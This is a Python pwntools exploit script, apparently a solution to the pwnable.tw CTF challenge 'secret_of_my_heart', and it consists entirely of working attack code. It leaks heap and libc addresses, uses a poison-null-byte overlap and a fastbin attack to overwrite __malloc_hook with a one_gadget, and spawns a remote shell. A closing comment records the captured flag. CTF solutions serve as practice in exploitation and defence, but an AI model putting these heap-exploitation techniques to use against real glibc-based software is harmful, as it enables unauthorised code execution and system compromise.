from pwn import *

elf = ELF("secret_of_my_heart")
libc = ELF("libc_64.so.6")
p = remote("chall.pwnable.tw", 10302)


def add(size: int, name, secret):
    p.recvuntil(b"Your choice :")
    p.sendline(b"1")
    p.recvuntil(b"Size of heart : ")
    p.sendline(str(size).encode())
    p.recvuntil(b"Name of heart :")
    p.send(name)
    p.recvuntil(b"secret of my heart :")
    p.send(secret)


def show(idx: int):
    p.recvuntil(b"Your choice :")
    p.sendline(b"2")
    p.recvuntil(b"Index :")
    p.sendline(str(idx).encode())


def delete(idx: int):
    p.recvuntil(b"Your choice :")
    p.sendline(b"3")
    p.recvuntil(b"Index :")
    p.sendline(str(idx).encode())


def secret():
    p.recvuntil(b"Your choice :")
    p.sendline(b"4869")


# leak heap && libc
add(0x10, b"a" * 0x20, b"leak heap")  # 0
show(0)
p.recvuntil(b"Name")
p.recvuntil(b"a" * 0x20)
heap_leak = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
heap_base = heap_leak - 0x10
log.info("heap_leak --> %s" % hex(heap_leak))
log.info("heap_base --> %s" % hex(heap_base))

# poison_null_byte && overlapping
with log.progress("poisoning null byte and overlapping") as l:
    add(0x100, b"b" * 0x20, b"A" * (0x100 - 0x10) + p64(0x100) + p64(0x10))  # 1
    add(0x100, b"b" * 0x20, b"B")  # 2
    add(0x18, b"b" * 0x20, b"split")  # 3
    delete(1)
    delete(0)
    add(0x18, b"b" * 0x20, b"a" * 0x18)  # 0

    add(0x80, b"c" * 0x20, b"\n")  # 1 a1
    add(0x68, b"c" * 0x20, b"\n")  # 4 a2

    delete(1)
    delete(2)
    l.success()

with log.progress("leaking libc") as l:
    add(0x88, b"d" * 0x20, b"\n")  # 1
    show(4)
    p.recvuntil(b"Secret : ")
    libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
    # libc_base = libc_leak - 0x3c4b78
    libc_base = libc_leak - 0x68 - libc.symbols["__malloc_hook"]
    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    fake_chunk = malloc_hook - 0x23
    one_gadget = libc_base + 0xef6c4
    l.status("libc_leak --> %s" % hex(libc_leak))
    sleep(1)
    l.status("malloc_hook --> %s" % hex(malloc_hook))
    sleep(1)
    l.status("fake_chunk --> %s" % hex(fake_chunk))
    sleep(1)
    l.status("one_gadget --> %s" % hex(one_gadget))
    sleep(1)
    l.success("libc_base --> %s" % hex(libc_base))

# attack malloc_hook
with log.progress("overwriting __malloc_hook") as l:
    delete(1)
    add(0xa0, b"e" * 0x20, b"a" * 0x80 + p64(0) + p64(0x71))  # 1
    delete(1)
    delete(4)
    add(0xa0, b"e" * 0x20, b"a" * 0x80 + p64(0) + p64(0x71) + p64(fake_chunk))  # 1
    add(0x68, b"f" * 0x20, b"tmp")
    add(0x68, b"f" * 0x20, b"a" * 0x13 + p64(one_gadget))
    l.status("triggering malloc_hook")
    delete(4)
    l.success()
    p.interactive()

# FLAG --> FLAG{It_just_4_s3cr3t_on_the_h34p}
